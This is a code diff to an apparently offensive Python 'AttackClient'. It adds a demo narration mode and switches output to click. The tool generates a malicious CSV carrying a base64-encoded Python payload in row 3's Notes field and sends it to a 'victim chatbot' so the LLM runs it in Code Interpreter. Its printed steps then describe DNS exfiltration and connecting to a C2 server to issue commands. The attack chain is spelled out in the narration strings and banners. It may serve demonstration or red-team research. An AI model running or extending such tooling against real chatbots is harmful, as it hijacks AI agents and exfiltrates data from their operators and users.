@@ -4,6 +4,7 @@ import os
 import tempfile
 from typing import Optional
 
+import click
 import requests
 
 from .config import get_config
@@ -25,6 +26,7 @@ class AttackClient:
         target_url: str,
         c2_domain: str = None,
         verbose: bool = False,
+        narrate: bool = False,
     ):
         """
         Initialize the attack client.
@@ -33,11 +35,13 @@ class AttackClient:
             target_url: Victim chatbot URL (e.g., https://chatbot.victim.com)
             c2_domain: C2 server domain (from config if not specified)
             verbose: Enable verbose output
+            narrate: Print step-by-step explanations for demo audiences
         """
         config = get_config()
         self.target_url = target_url.rstrip("/")
         self.c2_domain = c2_domain or config.domain
         self.verbose = verbose
+        self.narrate = narrate
         self.session_id = None
 
     def log(self, message: str, level: str = "info") -> None:
@@ -54,7 +58,12 @@ class AttackClient:
         if level == "debug" and not self.verbose:
             return
 
-        print(f"{prefix} {message}")
+        click.echo(f"{prefix} {message}")
+
+    def _narrate_msg(self, message: str) -> None:
+        """Print a narration line for demo audiences. Only shown with --narrate."""
+        if self.narrate:
+            click.echo(f"[~] {message}")
 
     def generate_payload(self, output_path: str = None) -> str:
         """
@@ -76,8 +85,6 @@ class AttackClient:
             c2_domain=self.c2_domain,
             session_id=self.session_id,
             output_path=output_path,
-            injection_row=3,
-            injection_style="technical",
         )
 
         self.log(f"Generated payload: {output_path}", "success")
@@ -194,25 +201,32 @@ class AttackClient:
         Returns:
             Session ID for C2 interaction
         """
-        print("\n" + "=" * 70)
-        print("  PROMPT INJECTION ATTACK - DNS EXFILTRATION")
-        print("=" * 70)
+        click.echo("\n" + "=" * 70)
+        click.echo("  PROMPT INJECTION ATTACK - DNS EXFILTRATION")
+        click.echo("=" * 70)
 
-        print(f"\n  Target:     {self.target_url}")
-        print(f"  C2 Domain:  {self.c2_domain}")
-        print()
+        click.echo(f"\n  Target:     {self.target_url}")
+        click.echo(f"  C2 Domain:  {self.c2_domain}")
+        click.echo()
 
         # Step 1: Generate payload
-        print("-" * 70)
-        print("  STEP 1: Generate malicious CSV")
-        print("-" * 70)
+        click.echo("-" * 70)
+        click.echo("  STEP 1: Generate malicious CSV")
+        click.echo("-" * 70)
+        self._narrate_msg("Generating malicious CSV with embedded prompt injection...")
         csv_path = self.generate_payload()
+        self._narrate_msg(
+            "CSV contains a base64-encoded Python payload in the Notes field of row 3"
+        )
 
         # Step 2: Send to victim
-        print()
-        print("-" * 70)
-        print("  STEP 2: Send to victim chatbot")
-        print("-" * 70)
+        click.echo()
+        click.echo("-" * 70)
+        click.echo("  STEP 2: Send to victim chatbot")
+        click.echo("-" * 70)
+        self._narrate_msg(
+            "Sending CSV to victim chatbot — the LLM will read it and execute the payload"
+        )
 
         if message is None:
             message = "Please analyze the revenue data and show me the top 10 customers by total revenue."
@@ -220,18 +234,23 @@ class AttackClient:
         result = self.send_attack(csv_path, message)
 
         # Step 3: Report results
-        print()
-        print("-" * 70)
-        print("  RESULT")
-        print("-" * 70)
+        click.echo()
+        click.echo("-" * 70)
+        click.echo("  RESULT")
+        click.echo("-" * 70)
 
         if result["status"] == "success":
-            print("\n  [SUCCESS] Payload delivered!")
+            click.echo("\n  [SUCCESS] Payload delivered!")
+            self._narrate_msg(
+                "The payload runs inside a Code Interpreter sandbox with only DNS access"
+            )
         else:
-            print(f"\n  [FAILED] {result.get('error', 'Unknown error')}")
-            print("  The payload was NOT delivered. Check the target URL and try again.")
+            click.echo(f"\n  [FAILED] {result.get('error', 'Unknown error')}")
+            click.echo(
+                "  The payload was NOT delivered. Check the target URL and try again."
+            )
 
-        print(f"\n  Session ID: {self.session_id}")
+        click.echo(f"\n  Session ID: {self.session_id}")
 
         # Cleanup temp file
         try:
@@ -239,11 +258,11 @@ class AttackClient:
         except:
             pass
 
-        print()
-        print("=" * 70)
-        print("  NEXT STEPS")
-        print("=" * 70)
-        print(
+        click.echo()
+        click.echo("=" * 70)
+        click.echo("  NEXT STEPS")
+        click.echo("=" * 70)
+        click.echo(
             f"""
   The payload is now running in the victim's Code Interpreter.
   Connect to the C2 session to send commands:
@@ -253,6 +272,6 @@ class AttackClient:
   Session ID: {self.session_id}
 """
         )
-        print("=" * 70 + "\n")
+        click.echo("=" * 70 + "\n")
 
         return self.session_id
